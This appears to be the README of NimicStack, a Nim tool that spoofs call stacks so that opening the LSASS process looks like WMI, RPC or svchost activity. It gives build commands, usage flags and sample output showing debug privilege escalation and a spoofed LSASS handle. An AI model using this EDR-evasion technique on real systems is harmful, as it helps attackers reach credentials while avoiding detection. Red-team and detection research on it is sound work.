# NimicStack

NimicStack is the pure Nim implementation of Call Stack Spoofing technique to mimic legitimate programs. Whole project is based on [the PoC shared by WithSecure Labs](https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs/)

# Compilation

You can directly compile the source code with the following command:

`nim c -d=mingw --app=console --cpu=amd64 -o:NimicStack.exe .\Main.nim`

In case you get the error "cannot open file", you should also install required dependencies:

`nimble install ptr_math winim`

# Usage

Like the reference project, NimicStack can mimic three example call stacks which are WMI, RPC and Svchost while opening the LSASS process. 

`.\NimicStack.exe <--wmi, --rpc, --svchost>`

Example output for mimicked WMI call stack:

```
PS C:\Users\test\Desktop\NimicStack> .\NimicStack.exe --wmi

███╗   ██╗██╗███╗   ███╗██╗ ██████╗███████╗████████╗ █████╗  ██████╗██╗  ██╗
████╗  ██║██║████╗ ████║██║██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
██╔██╗ ██║██║██╔████╔██║██║██║     ███████╗   ██║   ███████║██║     █████╔╝
██║╚██╗██║██║██║╚██╔╝██║██║██║     ╚════██║   ██║   ██╔══██║██║     ██╔═██╗
██║ ╚████║██║██║ ╚═╝ ██║██║╚██████╗███████║   ██║   ██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝╚═╝ ╚═════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

                              @R0h1rr1m

[+] wmi frame is selected!
[+] Required libraries were imported for return address calculation!
[+] SeDebugPrivilege is enabled!
[+] Fake Call Stack was created!
[+] Trying to find LSASS pid...
[+] LSASS pid found!: 756
[+] Registers were set for NtOpenProcess call!
[+] VEH callback was set for the suspended thread!
[+] Thread is resuming...
[+] VEH callback was called!
[+] Redirecting thread to RtlExitUserThread...
[+] Spoof is successful! Handle is 356
[+] You can check the spoofed call stack from Sysmon!
```

And Sysmon output for this call:

<img width="1246" alt="image" src="https://user-images.githubusercontent.com/26549173/182203399-9ace7885-cd7a-40a5-bb75-fd7d71c896cf.png">


# References

- https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs/
- https://github.com/countercept/CallStackSpoofer
